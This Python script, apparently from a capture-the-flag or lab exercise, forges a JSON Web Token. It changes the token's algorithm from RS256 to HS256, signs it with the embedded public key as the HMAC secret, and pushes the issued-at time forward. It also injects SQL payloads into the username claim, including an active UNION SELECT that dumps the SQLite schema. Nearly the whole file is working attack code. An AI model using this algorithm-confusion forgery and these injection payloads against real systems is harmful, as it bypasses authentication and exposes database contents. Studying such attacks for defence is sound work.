#!/usr/bin/python3

import base64
import json
import pprint
import datetime
import hmac
import hashlib
from collections import OrderedDict

# user = zoo, password = zoo  Sat 13:22
#jwtRaw = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InpvbyIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwOTAxNDA2MH0.XGjEQXgLf-P_G4Ucv6EzIl8AIJwPwmn6FkJLRZT_eE1IbKl1aNq-T2SqKN4ArN8_U-hb9wZPNfWNUMgX7l4AQkpU7Xvecoe5OSNeTmy551gUozGDLk8WP5cCGZBlx6xqAbSBn5i0R5qMjPNG8Yctq41S27Qbi0Ot2SZssg0oQuZrtTTlsQH5sLuzeqRk4NZLo8TW-2rRHUrkv8FrfK2WWFe4OxMCN398r7TStUbtqnver0Pv8puX1SD1XHmPXCwzfwLXd0VJI-Gwm7vQctHBLJ5lEJS2Qan1rr2wtyHLu1KOzKWT_Jlbwm2iQT1l5JWVcMIrdJ57jhVEloCp-FkE8g="

jwtRaw="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InpvbyIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwOTAyMTMxNH0.CVXpO0S_9c1C7A6RKTHbgzGNI8SKI3TZ9BUuXiJwyUK2hwYWjnXkxPqpv0IlMysvgylxG-e2hKC1bBwmvp-LhacFFrlqYmYQSrPC6pPcTy2Otl66uXOH6tEIobvH2QWHQtCFyIj2VVYMUrKvISlLM-jOr93QafYs3hrLAtQzdzCoeop2QguX_ARuoZIOnFHMu2-ukP51RIXNAFzv_1o4OKvEyBC4WWnY1xSxoopS5Ott7URKhZd66Gr0F-DG-mNPBssyefium7t0InlzCwKo5GWWZdsKhUO7n0Goxb7UF4f18zZEyDgmZHgV-XTEX-xVZxQjHam3pbWEswMHt9Ouvg"

# jwt token has 3 parts seperated by a period
try:
    # Split the token into the respective 3 parts
    headB64, paylB64, sig = jwtRaw.split(".",3)
except:
    print("Invalid Token")

############################### Header of JWT
# To look at the header section of the jwt
head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))

headDict = json.loads(head, object_pairs_hook=OrderedDict)
print("Current: " + str(headDict))
headDict["alg"] = "HS256"
print("New: " + str(headDict))
print("\n")
rebuiltHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")


################################ Payload of JWT
# To look at the payload of the jwt
payload = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
payloadDict = json.loads(payload, object_pairs_hook=OrderedDict)
print("Current Payload of JWT")
print("----------------------")
print(str(payloadDict))
#print(str(paylB64))

print("\nManipulating the username...")
print("----------------------------")

print("Current Username: " + payloadDict["username"])
# manipulate the username below
# Test SQL Injection
#payloadDict["username"] = "zoo' and 1=1-- -"
# Cause SQL Injection Error
#payloadDict["username"] = "zoo' order by 4;--`"
# Union Select to Display the values we want to see
#payloadDict["username"] = "zoo' AND 1=0 UNION SELECT 111,222,333;--"
# Using a union select display the structure of the database
payloadDict["username"] = "zoo' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--"
print("New Username: " + str(payloadDict["username"]))
print("\n")
print("Manipulating the iat...")
print("----------------------------")
nowtime = int(datetime.datetime.now().timestamp())
timestampPayload = datetime.datetime.fromtimestamp(int(payloadDict["iat"]))
if int(timestampPayload.timestamp()) < nowtime:
    print("IAT: " + str(payloadDict["iat"]) + " Payload Timestamp: " + str(timestampPayload) + " has expired!")
    # Manipulate the iat to be 20 minutes ahead of current time
    timestampNow = datetime.datetime.fromtimestamp(nowtime)
    print("Current Timestamp: " + str(timestampNow))
    newtime = nowtime + 1200
    timestampNew = datetime.datetime.fromtimestamp(newtime)
    payloadDict["iat"] = newtime
    print("New Timestamp: " + str(payloadDict["iat"]) + " New Timestamp: " + str(timestampNew))
#print("\nPublic Key")
publicKey = payloadDict["pk"]
#print(publicKey)
# Rebuild the base64 for the payload
rebuiltPayload = base64.urlsafe_b64encode(json.dumps(payloadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
print("New Payload of JWT")
print("---------------------------")
print(str(payloadDict))
#print(str(rebuiltPayload))
print("\n")

################################# Signature of the JWT
# To look at the signature section of the jwt
sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
print("Current Signature: " + sig)
newToken = rebuiltHead + "." + rebuiltPayload
#print(newToken)
rebuiltSig = base64.urlsafe_b64encode(hmac.new(publicKey.encode(),newToken.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
print("New Signature: " + rebuiltSig)

print("\n\nNew JWT Token")
print("----------------------------------------------")
newJWT = rebuiltHead + "." + rebuiltPayload + "." + rebuiltSig
print(newJWT)
